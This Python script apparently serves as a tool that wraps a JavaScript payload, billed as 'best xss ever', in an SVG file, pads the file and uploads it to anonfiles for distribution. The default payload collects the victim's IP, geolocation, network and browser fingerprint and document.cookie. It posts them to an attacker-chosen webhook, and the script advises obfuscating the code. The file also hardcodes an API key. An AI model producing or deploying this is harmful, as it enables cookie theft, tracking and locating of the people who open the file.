import time
import os
import re

try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests


SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script>
        %code%
    </script>
</svg>
"""
js_payload_code = """
async function getIPInfo() {
    const response = await fetch('https://api.ipdata.co/?api-key=d75ad8557d1eb86f55d816c62987104cc8e1fe9b219dd85857875a44');
    const data = await response.json();
    const isMobile = navigator.userAgent.toLowerCase().includes("mobile");
    const platform = navigator.platform.toLowerCase();
    const blocklists = data.threat.blocklists.map((blocklist) => {
      return `\n+ Name: ${blocklist.name} \n+ Site: ${blocklist.site} \n+ Type: ${blocklist.type}`;
    });    
    
    const provider = {
      asn: {
        asn: data.asn.asn,
        name: data.asn.name,
        domain: data.asn.domain,
        route: data.asn.route,
        type: data.asn.type
      }}

    function getConnectionSpeed() {
      if (navigator.connection && navigator.connection.effectiveType) {
        return `${(navigator.connection.downlink * 8).toFixed(2)} Mb/s`;
      }
      return 'Unknown';
    }
    const connectionSpeed = getConnectionSpeed();
    
    function getNetworkType() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (!connection) {
        return 'unknown';
      }
      const type = connection.effectiveType || connection.type;
      if (type === 'ethernet') {
        return 'Ethernet';
      }
      return type;
    }
    const networkType = getNetworkType();
    
    const getIP = async () => {
      try {
        const response = await fetch('https://ipapi.co/json');
        const data = await response.json();
        return data;
      } catch (error) {
        console.error(error);
        return null;
      }
    };
    
    const ipData = await getIP();
    const ipv4 = ipData?.ip;
    const ipv6network = ipData?.network;
  
    let manufacturer;
  
    if (/^win/.test(platform)) {
      manufacturer = 'Microsoft';
    } else if (/^mac/.test(platform)) {
      manufacturer = 'Apple';
    } else if (/^linux/.test(platform)) {
      manufacturer = 'Linux';
    } else if (/^android/.test(platform)) {
      manufacturer = 'Google';
    } else if (/^ios/.test(platform)) {
      manufacturer = 'Apple';
    } else {
      manufacturer = 'Unknown';
    }
    
    const currencyInfo = {
      symbol: data.currency.symbol,
      name: data.currency.name,
      code: data.currency.code
    };

    const timeZoneInfo = {
      name: data.time_zone.name,
      offset: data.time_zone.offset
    };
    
    const ipInfo = {
      location: {
        IPv4: data.ip,
        continent: data.continent_code,
        country: data.country_name,
        country_code: data.country_code,
        latitude: data.latitude,
        longitude: data.longitude,
        state: data.region,
        city: data.city,
        googleMaps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
        timezone: timeZoneInfo,
        currency: currencyInfo,
        phoneCode: `+${data.calling_code}`,
        languages: data.languages.map(lang => ({ name: lang.name, native: lang.native, code: lang.code })),
        inEU: data.is_eu ? 'Yes' : 'No'
      },
      info: {
        ipv4: ipv4,
        ip: data.ip,
        provider: `${data.asn.name} (${data.asn.domain}) - ${data.asn.type}`,
        version: data.version,
        network: `${data.asn.route}`,
        ipv6network: ipv6network,
        connectionSpeed: getConnectionSpeed(),
        wifiType: getNetworkType(),
        threat: {
          is_tor: data.threat.is_tor,
          is_vpn: data.threat.is_proxy,
          is_icloud_relay: data.threat.is_icloud_relay,
          is_proxy: data.threat.is_proxy,
          is_datacenter: data.threat.is_datacenter,
          is_anonymous: data.threat.is_anonymous,
          is_known_attacker: data.threat.is_known_attacker,
          is_known_abuser: data.threat.is_known_abuser,
          is_threat: data.threat.is_threat,
          is_bogon: data.threat.is_bogon,
          blocklists: blocklists
        }
      },

      browserInfo: {
        mobile: isMobile,
        browser: navigator.appName,
        manufacturer: manufacturer,
        userAgent: navigator.userAgent,
        page: location.href,
        referrer: document.referrer,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        historyLength: history.length,
        language: navigator.language,
        platform: navigator.platform,
        javaEnabled: navigator.javaEnabled(),
        cookiesEnabled: navigator.cookieEnabled,
        javascriptEnabled: true,
        cookieDump: document.cookie,
        cpuThreads: navigator.hardwareConcurrency,
        memory: `${Math.round((performance.memory.totalJSHeapSize / 1048576) * 100) / 100} MB`,
        plugins: Array.from(navigator.plugins).map((plugin) => `${plugin.name} (${plugin.description})`).join(', '),
        webdriver: navigator.webdriver ? 'Yes' : 'No',
        battery: navigator.getBattery ? await navigator.getBattery().then((battery) => `${Math.floor(battery.level * 100)}%`) : 'N/A',
        touchPoints: navigator.maxTouchPoints || '???',
        doNotTrack: navigator.doNotTrack === '1' || navigator.doNotTrack === 'yes' ? 'Yes' : 'No'
      }
    }; 
  
    const embed = {
      title: '__**Someone Visited Your Site!**__',
      description: '**IP Info**\n' + 
        '```diff\n' +
        `- Location Information:\n` +
        `+ IP: ${ipInfo.location.IPv4}\n` +
        `+ Continent: ${ipInfo.location.continent}\n` +
        `+ Country: ${ipInfo.location.country}\n` +
        `+ Country Code: ${ipInfo.location.country_code}\n` +
        `+ State: ${ipInfo.location.state}\n` +
        `+ City: ${ipInfo.location.city}\n` +
        `+ Google Maps: ${ipInfo.location.googleMaps}\n` +
        `+ Timezone: ${timeZoneInfo.name} (Offset: ${timeZoneInfo.offset})\n` +
        `+ Currency: ${currencyInfo.symbol} - ${currencyInfo.name} (${currencyInfo.code})\n` +
        `+ Phone Code: ${ipInfo.location.phoneCode}\n` +
        `+ Languages: ${ipInfo.location.languages.map(lang => `${lang.name} - ${lang.code}`).join(', ')}\n` +
        `+ In EU: ${ipInfo.location.inEU}\n\n` + 
        `+ Latitude: ${ipInfo.location.latitude}\n` +
        `+ Longitude: ${ipInfo.location.longitude}\n\n` +
        `- Network Information:\n` +
        `+ IP (IPv6): ${ipInfo.info.ipv4}\n` +
        `+ Network (IPv6): ${ipInfo.info.ipv6network}\n` +
        `+ IP (IPv4): ${ipInfo.info.ip}\n` +
        `+ Network (IPv4): ${ipInfo.info.network}\n` +
        `+ Bandwith: ${ipInfo.info.connectionSpeed}\n` +
        `+ Wifi Type: ${ipInfo.info.wifiType}\n` +
        `+ Provider: ${ipInfo.info.provider}\n\n` +
        `- Threats & Proxy/VPN Information:\n` +
        `+ Threat: ${ipInfo.info.threat.is_threat}\n` +
        `+ VPN: ${ipInfo.info.threat.is_vpn}\n` +
        `+ Proxy: ${ipInfo.info.threat.is_proxy}\n` +
        `+ Tor Browser: ${ipInfo.info.threat.is_tor}\n` +
        `+ Known Abuser: ${ipInfo.info.threat.is_known_abuser}\n\n` +
        `+ BlockLists: ${ipInfo.info.threat.blocklists}\n` +
        '```' + 
        '**Browser Info**\n' + 
        '```diff\n' + 
        `- Browser & Document Information:\n` +
        `+ Mobile: ${ipInfo.browserInfo.mobile}\n` +
        `+ Browser: ${ipInfo.browserInfo.browser}\n` +
        `+ Manufacturer: ${ipInfo.browserInfo.manufacturer}\n` +
        `+ User Agent: ${ipInfo.browserInfo.userAgent}\n` +
        `+ Page: ${ipInfo.browserInfo.page}\n` +
        `+ Referrer: ${ipInfo.browserInfo.referrer}\n` +
        `+ Window Size: ${ipInfo.browserInfo.windowSize}\n` +
        `+ History Length: ${ipInfo.browserInfo.historyLength}\n` +
        `+ Language: ${ipInfo.browserInfo.language}\n` +
        `+ Platform: ${ipInfo.browserInfo.platform}\n` +
        `+ Java Enabled: ${ipInfo.browserInfo.javaEnabled}\n` +
        `+ Cookies Enabled: ${ipInfo.browserInfo.cookiesEnabled}\n` +
        `+ Javascript Enabled: ${ipInfo.browserInfo.javascriptEnabled}\n` +
        `+ CPU Threads: ${ipInfo.browserInfo.cpuThreads}\n` +
        `+ Memory: ${ipInfo.browserInfo.memory}\n` + 
        `+ Plugins: ${ipInfo.browserInfo.plugins}\n` +
        `+ Webdriver/Bot: ${ipInfo.browserInfo.webdriver}\n` +
        `+ Battery: ${ipInfo.browserInfo.battery}\n` +
        `+ Touch Points: ${ipInfo.browserInfo.touchPoints}\n` +
        `+ Do Not Track: ${ipInfo.browserInfo.doNotTrack}\n\n` +
        `+ Cookie Dump: ${ipInfo.browserInfo.cookieDump}` +
        '```' + `\n Made by ! LO$R`,
        color: 0x00FF00
      };
      
      const webhookURL = 'WEBHOOK_URL';
      
      await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: `@everyone new log`,
          embeds: [embed]
        })
      });
  }
  getIPInfo();
"""


class main:
    def __init__(self) -> None:
        self.js_code = input("Would you like to use default js payload? (best xss ever) [y/n] -> ")
        if self.js_code.lower() == "y":
            self.js_code2 = js_payload_code
            self.webhook = input("What is the webhook url? -> ")
            self.js_code2 = self.js_code2.replace("WEBHOOK_URL", self.webhook)
        else:
            self.js_code = input("What is the path of the js payload? -> ")
        self.name = input("What do you want to name the file? (without extension) -> ")
        self.filetype = "svg"
        self.download_link_type = input(
            "Would you also like the direct download link? (y/n) -> "
        )
        pump = input("Would you like to pump the file for more size? (y/n) -> ")
        if pump.lower() == "y":
            self.pump = input("How many MB would you like to pump the file? -> ")
        else:
            self.pump = False
        self.main()
        input("Press enter to exit")

    def get_direct_download_link(self, url):
        r = requests.get(url)
        text = r.text
        regex = (
            r'https://cdn-[0-9]+\.anonfiles\.com/[A-Za-z0-9]+/[A-Za-z0-9]+-[0-9]+/[^"]+'
        )
        match = re.findall(regex, text)
        return match[0]

    def main(self):
        print(
            "Please remember to Obfuscate your JavaScript code before using this tool."
        )
        try:
            js_code = self.js_code2
        except AttributeError:
            try:
                with open(self.js_code, "r") as f:
                    js_code = f.read()
                    js_code = "\t\t".join(js_code.splitlines())
            except FileNotFoundError:
                print("File not found")
                time.sleep(3)
                exit()

        extra_chars = "A" * (1024 * 1024 * int(self.pump))
        svg = SVG.replace("%code%", js_code) + extra_chars
        svg_bytes = svg.encode("utf-8")
        try:
            r = requests.post(
                "https://api.anonfiles.com/upload",
                files={"file": (f"{self.name}.{self.filetype}", svg_bytes)},
            )
        except Exception as e:
            print(f"[-] {e}")
            time.sleep(3)
            exit()
        url = r.json()["data"]["file"]["url"]["short"]
        if self.download_link_type.lower() == "y":
            download_link = self.get_direct_download_link(url)
            print(
                f"Download link (short): {url} | Download link (direct): {download_link}"
            )
        else:
            print(f"Download link: {url}")


if __name__ == "__main__":
    main()
